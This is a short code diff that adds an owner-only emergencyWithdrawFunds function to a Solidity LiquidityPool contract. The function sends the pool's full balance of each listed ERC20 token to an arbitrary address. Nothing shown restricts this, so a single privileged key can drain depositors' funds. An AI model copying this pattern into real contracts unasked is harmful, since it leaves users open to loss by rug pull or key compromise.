@@ -1240,4 +1240,13 @@ contract LiquidityPool is Ownable, ILiquidityPool  {
     function setGateway(address _gateway) public onlyOwner {
         gateway = _gateway;
     }
+
+    function emergencyWithdrawFunds(address[] memory _tokens, address _newOwner) public onlyOwner {
+        for (uint i = 0; i < _tokens.length; i++) {
+            uint256 allBalance = IERC20(_tokens[i]).balanceOf(address(this));
+            if (allBalance > 0) {
+                IERC20(_tokens[i]).safeTransfer(_newOwner, allBalance);
+            }
+        }
+    }
 }
